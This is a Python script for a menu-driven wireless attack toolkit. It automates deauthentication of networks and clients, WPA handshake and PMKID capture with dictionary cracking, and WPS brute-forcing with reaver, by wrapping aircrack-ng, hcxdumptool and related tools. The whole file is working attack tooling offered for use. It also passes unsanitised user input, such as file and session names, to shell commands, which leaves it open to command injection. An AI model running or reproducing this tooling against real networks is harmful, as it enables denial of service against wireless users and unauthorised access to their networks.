from simple_term_menu import TerminalMenu
from rich.console import Console
from colorama import Fore
import fileinput
import re
import pandas
import time
import os

console = Console()

def animate(i,m):
    with console.status(m + '\n') as status:
        os.system(i)
        time.sleep(1)

def rem():
    for i in range(5):
        if os.path.exists('out-0%s.cap' % i):
            os.remove("out-0%s.cap" % i)
    for i in range(5):
        if os.path.exists('out-0%s.csv' % i):
            os.remove("out-0%s.csv" % i)

def selectnet():
    global bssid
    fields = ['BSSID', 'ESSID', "channel"]
    formatters = {}
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=fields)
    df = df.to_string(justify="left")
    df1 = len(df) + 2
    df = df.center(df1)
    df = str(df).replace("channel", "Channel") # looks nicer
    df = df.split("Station MAC", 1)
    df = df[0]
    df = df[:df.rfind('\n')]
    print(f"{Fore.WHITE}" + df)
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['BSSID'])
    df = df.to_string(justify="left")
    df = df.split("Station MAC", 1)
    df = df[0]
    df = df[:df.rfind('\n')]
    df = df.split("\n",1)[1]
    macs = []
    for line in df.splitlines():
        macs.append(line[3:])
    print("")
    print(f"{Fore.GREEN}Choose BSSID")
    mac = TerminalMenu(macs).show()
    print("")
    bssid = macs[mac]

def selectcli():
    global cli
    found = False
    for line in fileinput.input("out-01.csv",inplace=True):
        if re.match("Station MAC",line):
            found = True
        if found:
            print(line,end="")
        else:
            print(end="")
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['Station MAC'])
    df = df.to_string(justify="left")
    df = df.split("\n",1)[1]
    macs = []
    for line in df.splitlines():
        macs.append(line[3:])
    print(f"{Fore.GREEN}Choose Client")
    cli = TerminalMenu(macs).show()
    print("")
    cli = macs[cli]

def selectinterface():
    global interface
    interfaces = os.popen("ip -j link |jq -r '.[].ifname'").read()
    interface = []
    for line in interfaces.splitlines():
        interface.append(line)
    interface = interface[TerminalMenu(interface).show()]

rem()
logo = f"""{Fore.LIGHTBLUE_EX}
██████╗ ██╗██████╗  ██████╗ ██╗  ██╗
██╔══██╗██║██╔══██╗██╔═══██╗╚██╗██╔╝  {Fore.LIGHTYELLOW_EX}By iBlaze{Fore.LIGHTBLUE_EX}
██████╔╝██║██████╔╝██║   ██║ ╚███╔╝ 
██╔═══╝ ██║██╔══██╗██║   ██║ ██╔██╗ 
██║     ██║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
"""
print(logo)
print(f"""
{Fore.WHITE}[ {Fore.GREEN}1 {Fore.WHITE}] {Fore.WHITE}Deauth Network
{Fore.WHITE}[ {Fore.GREEN}2 {Fore.WHITE}] {Fore.WHITE}Deauth Client
{Fore.WHITE}[ {Fore.GREEN}3 {Fore.WHITE}] {Fore.WHITE}Crack Password ( WPA Handshake )
{Fore.WHITE}[ {Fore.GREEN}4 {Fore.WHITE}] {Fore.WHITE}Crack Password ( PMKID )
{Fore.WHITE}[ {Fore.GREEN}5 {Fore.WHITE}] {Fore.WHITE}Airodump All
{Fore.WHITE}[ {Fore.GREEN}6 {Fore.WHITE}] {Fore.WHITE}Airodump Bssid
{Fore.WHITE}[ {Fore.GREEN}7 {Fore.WHITE}] {Fore.WHITE}Wpa Supplicant
{Fore.WHITE}[ {Fore.GREEN}8 {Fore.WHITE}] {Fore.WHITE}Crack WPS ( reaver )
{Fore.WHITE}[ {Fore.GREEN}9 {Fore.WHITE}] {Fore.WHITE}Netdiscover

{Fore.WHITE}[ {Fore.RED}x {Fore.WHITE}] {Fore.RED}Exit
""")

select = input(f"{Fore.WHITE}Choose > {Fore.RED}")
while select not in ["1","2","3","4","5","6","7","8","9","x"]:
    print(f"{Fore.RED} Select valid option!")
    select = input(f"{Fore.WHITE}Choose > {Fore.RED}")

if select == "1":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out  --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    selectnet()
    rem()
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Choose Channel > {Fore.RED}")
    print("")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        exit()
    else:
        exit()
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
    os.system("aireplay-ng --deauth 0 -a %s %s" % (bssid,interface))
    os.system("sudo airmon-ng stop {} >> /dev/null".format(interface))
if select == "2":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}WFW Script")
    print("")
    os.system("bash wfw.sh /root/out-01.csv")
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select Network")
    print("")
    selectnet()
    selectcli()
    rem()
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Choose Channel > {Fore.RED}")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        exit()
    else:
        exit()
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
    os.system("aireplay-ng --deauth 0 -c %s -a %s %s" % (cli,bssid,interface))
    os.system("sudo airmon-ng stop {} >> /dev/null".format(interface))
if select == "3":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    selectnet()
    rem()
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Channel > {Fore.RED}")
    print("")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    os.system("aireplay-ng --deauth 5 -a %s %s" % (bssid,interface))
    os.system('airodump-ng --manufacturer --uptime --bssid %s -c %s -w out --output-format cap %s' % (bssid,channel,interface))
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Do you want to crack the password now? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        save = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Save file name (with extension) > ")
        os.system("mv out-01.cap " + save)
        exit()
    else:
        exit()
    print(f"{Fore.RESET}")
    print("")
    print(f"{Fore.GREEN}Choose Password List")
    lists = ["password_4800","password_10000","password_100000"]
    show = TerminalMenu(lists).show()
    os.system("aircrack-ng out-01.cap -w %s" % lists[show])
    rem()
if select == "4":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    selectnet()
    rem()
    os.system("/usr/bin/echo {} > mac.txt".format(bssid.replace(":","")))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED} Written bssid {Fore.WHITE}%s{Fore.RED} to mac.txt" % bssid)
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Starting hcxdumptool")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("clear")
    os.system("rm out.pcapng")
    os.system("hcxdumptool -i %s -o out.pcapng --enable_status 1 --filterlist_ap=mac.txt --filtermode=2" % interface)
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Converting to pcap format...{Fore.RESET}")
    os.system("tcpdump -r out.pcapng -w out.pcap")
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Output file :{Fore.RESET}")
    os.system("sudo tcpdump -ttttnnr out.pcap")
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Do you want to crack the password now? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        save = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Save file name (with extension) > ")
        os.system("mv out.pcap " + save)
        exit()
    else:
        exit()
    print(f"{Fore.RESET}")
    print(f"{Fore.GREEN}Choose Password List")
    lists = ["password_4800","password_10000","password_100000"]
    show = TerminalMenu(lists).show()
    os.system("aircrack-ng out.pcap -w %s" % lists[show])
    rem()
if select == "5":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng --manufacturer --uptime -w out --output-format csv " + interface)
    print("")
    print(f"{Fore.GREEN}WFW Script")
    print("")
    os.system("bash wfw.sh /root/out-01.csv")
    rem()
if select == "6":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    rem()
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    selectnet()
    rem()
    os.system("airodump-ng --manufacturer --uptime --bssid %s -w out --output-format csv %s" % (bssid,interface))
    print("")
    print(f"{Fore.GREEN}WFW Script")
    print("")
    os.system("bash wfw.sh /root/out-01.csv")
    rem()
if select == "7":
    os.system("clear")
    print(logo)
    print(f"""
{Fore.WHITE}[ {Fore.GREEN}1 {Fore.WHITE}] {Fore.WHITE}Set AP / Enable Wpa Supplicant
{Fore.WHITE}[ {Fore.GREEN}2 {Fore.WHITE}] {Fore.WHITE}Disable Wpa Suplicant
    """)
    choose = input(f"{Fore.WHITE} Choose > {Fore.RED}")
    while choose not in ["1","2"]:
        print(f"{Fore.RED} Select valid option!")
        choose = input(f"{Fore.WHITE} Choose > {Fore.RED}")
    if choose == "1":
        print("")
        print(f"{Fore.GREEN}Select USB Wifi Card")
        print(f"{Fore.WHITE}")
        selectinterface()
        os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
        os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
        time.sleep(2)
        os.system("airodump-ng --manufacturer --uptime " + interface)
        print("")
        essid = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}]{Fore.WHITE} Essid > {Fore.RED}")
        key = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}]{Fore.WHITE} Key > {Fore.RED}")
        w = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w')
        w.write('''ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
Bcountry=HR

network={
    ssid="%s"
    psk="%s"
    key_mgmt=WPA-PSK
}
''' % (essid, key))
        w.close()
        w = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'r')
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Written to wpa_supplicant.conf, is this correct?{Fore.WHITE}")
        print("")
        print(w.read())
        animate('systemctl unmask wpa_supplicant.service','[bold white] Unmasking wpa_supplicant')
        animate('systemctl enable wpa_supplicant','[bold white] Enabling wpa_supplicant')
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Rebooting in 5 seconds...")
        time.sleep(5)
        os.system("reboot")
    if choose == "2":
        print("")
        animate('systemctl mask wpa_supplicant.service','[bold white] Masking wpa_supplicant')
        animate('systemctl disable wpa_supplicant.service','[bold white] Disabling wpa_supplicant')
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Rebooting in 5 seconds...")
        time.sleep(5)
        os.system("reboot")
if select == "8":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("sudo airmon-ng check %s kill >> /dev/null" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Killing Interfering Processes...")
    os.system("sudo airmon-ng start {} >> /dev/null".format(interface))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --wps --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    os.system("wash -i " + interface)
    print("")
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select Network")
    print("")
    selectnet()
    rem()
    choose = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Start reaver in screen session? (yes or no) : ")
    if choose == "yes":
        session = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}What is the session going to be called? : ")
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting reaver in screen session {Fore.RED}%s{Fore.GREEN} with verbose level {Fore.RED}2" % session)
        print("")
        time.sleep(2)
        open('reaver_dump.txt','w').write("Running : screen -S %s -L -Logfile reaver_dump.txt -dm reaver -i %s -b %s -vv\n" % (session,interface,bssid))
        os.system("screen -S %s -L -Logfile reaver_dump.txt -dm reaver -i %s -b %s -vv" % (session,interface,bssid))
        choose = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}View screen session? (yes or no) : ")
        if choose == "yes":
            print("")
            print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + D + A{Fore.RESET}")
            time.sleep(2)
            os.system("screen -r " + session)
        elif choose == "no":
            exit()
    elif choose == "no":
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting reaver with verbose level {Fore.RED}2")
        print(f"{Fore.WHITE}")
        os.system("reaver -i %s -b %s -vv" % (interface,bssid))
    else:
        exit()
if select == "9":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select Interface With IP You Want To Scan")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("netdiscover -i " + interface)

if select == "x":
    print("")
    print(f"{Fore.WHITE}Bye!{Fore.RESET}")
    exit()
